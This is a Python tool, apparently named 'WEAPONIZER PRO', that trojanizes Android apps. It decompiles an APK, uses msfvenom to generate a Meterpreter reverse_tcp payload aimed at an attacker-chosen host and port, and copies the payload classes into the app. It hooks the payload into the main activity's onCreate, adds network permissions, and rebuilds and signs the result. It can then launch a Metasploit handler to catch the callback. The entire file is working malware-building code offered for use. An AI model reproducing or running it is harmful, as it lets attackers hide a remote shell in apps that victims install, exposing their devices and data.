#!/usr/bin/env python3
import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- PALETA DE CORES ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Direct Injection & Build Engine{RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def build_e_assinar(out):
    """Recompila e assina o APK, garantindo que o arquivo final seja gerado."""
    default_name = f"{out}_weaponized.apk"
    print(f"\n {YELLOW}»{RESET} Nome do arquivo final (Ex: app.apk) [Enter para {default_name}]:")
    custom_name = input(f" {RED}# {RESET}").strip()
    
    final_filename = custom_name if custom_name else default_name
    if not final_filename.endswith(".apk"): final_filename += ".apk"
    
    final_path = os.path.abspath(final_filename)
    log(f"Iniciando recompilação da pasta '{out}'...", "info")
    
    # 1. Recompilar (Mostrando erros se houver)
    res_b = subprocess.run(["apktool", "b", out, "-o", "t.apk"], capture_output=True, text=True)
    if not os.path.exists("t.apk"):
        log("Falha crítica no Apktool! Verifique se você editou algo errado nos arquivos.", "error")
        print(f"{RED}LOG DE ERRO DO APKTOOL:{RESET}\n{res_b.stderr}")
        return False

    # 2. Gerar Key (se não existir)
    if not os.path.exists("debug.keystore"):
        log("Gerando nova chave de assinatura...", "info")
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", "debug.keystore", "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)

    # 3. Assinar
    log(f"Assinando o aplicativo como '{final_filename}'...", "info")
    res_s = subprocess.run(["apksigner", "sign", "--ks", "debug.keystore", "--ks-pass", "pass:android", "--out", final_path, "t.apk"], capture_output=True, text=True)
    
    if os.path.exists("t.apk"): os.remove("t.apk")

    # 4. Verificação Final
    if os.path.exists(final_path):
        print(f"\n{GREEN}[+++] SUCESSO!{RESET}")
        print(f"{WHITE}Local do arquivo:{RESET} {BOLD}{final_path}{RESET}")
        return True
    else:
        log("O arquivo final não foi gerado. Verifique as permissões da pasta.", "error")
        print(f"{RED}LOG DE ERRO DO APKSIGNER:{RESET}\n{res_s.stderr}")
        return False

def gerar_e_injetar_payload(project_folder):
    lhost = input(f" {YELLOW}»{RESET} LHOST (IP/DNS): ").strip()
    lport = input(f" {YELLOW}»{RESET} LPORT: ").strip()
    if not lhost or not lport: return False, None, None

    log(f"Gerando Meterpreter e migrando classes...", "info")
    subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "p.apk"], capture_output=True)
    subprocess.run(["apktool", "d", "p.apk", "-o", "p_tmp", "-f"], capture_output=True)
    
    # Injeção de classes
    src = os.path.join("p_tmp", "smali", "com", "metasploit")
    dst = os.path.join(project_folder, "smali", "com", "metasploit")
    if os.path.exists(dst): rmtree(dst)
    copytree(src, dst)

    # Identificar MainActivity
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        m = f.read()
        match_act = re.search(r'<activity [^>]*android:name="([^"]+)"', m)
        if not match_act: return False, None, None
        main_activity = match_act.group(1)
        if main_activity.startswith('.'):
            match_pkg = re.search(r'package="([^"]+)"', m)
            pkg = match_pkg.group(1) if match_pkg else ""
            main_activity = pkg + main_activity

    # Busca recursiva do arquivo .smali
    rel_path = main_activity.replace('.', '/') + ".smali"
    smali_path = None
    for i in range(1, 15):
        folder = "smali" if i == 1 else f"smali_classes{i}"
        test_path = os.path.join(project_folder, folder, rel_path)
        if os.path.exists(test_path):
            smali_path = test_path; break

    if smali_path:
        log(f"Ponto de Hook: {os.path.basename(smali_path)}", "success")
        with open(smali_path, "r") as f: lines = f.readlines()
        new_lines, injected, in_oncreate = [], False, False
        for line in lines:
            new_lines.append(line)
            if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line: in_oncreate = True
            if in_oncreate and "invoke-super" in line and not injected:
                new_lines.append("\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n")
                injected = True
            if ".end method" in line: in_oncreate = False
        with open(smali_path, "w") as f: f.writelines(new_lines)

        # Injeção de Permissões
        with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f: content = f.read()
        needed = ['<uses-permission android:name="android.permission.INTERNET"/>', '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>']
        for p in needed:
            if p not in content: content = content.replace("</manifest>", f"    {p}\n</manifest>")
        with open(os.path.join(project_folder, "AndroidManifest.xml"), "w") as f: f.write(content)

        if os.path.exists("p_tmp"): rmtree("p_tmp")
        if os.path.exists("p.apk"): os.remove("p.apk")
        return True, lhost, lport
    return False, None, None

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile\n [{RED}2{RESET}] INJETAR SHELL + BUILD + SIGN\n [{RED}3{RESET}] Listar Arquivos (ls)\n [{RED}4{RESET}] Sair")
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@romildo:~# {RESET}").strip()
        
        if cmd == "3" or cmd.lower() == "ls":
            subprocess.run(["ls", "-F", "--color=auto"]); input("\nEnter...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} Arquivo APK: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                subprocess.run(["apktool", "d", file, "-o", out, "-f"])
                log(f"Pasta criada: {out}", "success"); time.sleep(2)
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                success, ip, port = gerar_e_injetar_payload(out)
                if success:
                    if build_e_assinar(out):
                        if input(f"\n{YELLOW}[?]{RESET} Iniciar Handler? (s/n): ").lower() == 's':
                            os.system(f"msfconsole -q -x 'use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; exploit'")
            else: log("Pasta inválida.", "error"); time.sleep(1)
        elif cmd == "4" or cmd.lower() == "exit": break

if __name__ == "__main__":
    main()
